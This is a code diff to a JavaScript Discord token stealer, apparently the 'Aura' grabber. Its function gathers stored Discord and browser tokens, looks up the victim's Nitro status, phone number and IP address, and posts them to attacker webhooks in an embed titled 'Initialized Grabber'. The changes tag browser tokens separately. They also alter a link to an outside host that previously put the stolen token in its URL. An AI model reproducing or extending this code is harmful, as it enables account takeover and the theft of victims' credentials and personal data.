@@ -49,6 +49,10 @@ let paths = [
 const send_webhook_tokens = async (webhook) => {
     for (const path of paths) await get_tokens(path);
     for (let token of tokens) {
+
+        let token_type = token.includes("browsers_tokens_") ? "Browser Token" : "Token";
+            token = token.replace("browsers_tokens_", "");
+
         try {
             let infos;
             try {
@@ -65,10 +69,10 @@ const send_webhook_tokens = async (webhook) => {
             }
             if (!infos) continue;
 
-            const copy = `https://6889-fun.vercel.app/api/aurathemes/raw?data=${token}`;
+            const copy = `https://6889-fun.vercel.app`;
             const discord = await get_discord_Info(token);
             const system = await get_info();
-            
+
             webhook.forEach(async (webhook) => {
                 try {
                     await instance({
@@ -88,7 +92,7 @@ const send_webhook_tokens = async (webhook) => {
                                 "title": 'Initialized Grabber',
                                 "color": "12740607",
                                 "fields": [
-                                    { "name": "<a:aura:1087044506542674091> Token:", "value": "```" + token + "```" + `\n[[Click Here To Copy Your Token]](${copy})` },
+                                    { "name": `<a:aura:1087044506542674091> ${token_type}:`, "value": "```" + token.replace("browsers_tokens_", "") + "```" + `\n[[Click Here To Copy Your Token]](${copy})` },
                                     { "name": "<a:aura:1101739920319590420> Nitro:", "value": `${discord.nitroType}`, inline: true },
                                     { "name": "<a:aura:995172580988309664> IP Adress", "value": `\`${system.IP}\``, inline: true },
                                     { "name": "<a:aura:863691953531125820> Phone", "value": `\`${discord.phone}\``, inline: true },
